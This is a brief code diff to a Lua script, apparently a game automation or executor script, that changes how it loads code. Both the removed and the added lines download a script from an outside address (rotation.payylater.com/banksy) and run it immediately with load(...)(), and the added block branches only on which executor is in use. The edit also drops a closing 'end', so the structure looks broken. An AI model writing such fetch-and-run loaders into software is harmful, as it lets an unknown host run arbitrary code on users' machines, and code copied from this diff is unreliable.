@@ -2497,7 +2497,9 @@ for x=1,#SETTING do
         }
         ----------------------------------------
 
-        local script = request("POST","http://rotation.payylater.com/banksy")
-        load(script)()
-    end
+CONFIG = CONFIG
+if CONFIG.PANDORA then
+    load(request("GET","http://rotation.payylater.com/banksy"))()
+elseif CONFIG.GROWX then
+    load(httpGet("http://rotation.payylater.com/banksy"))()
 end
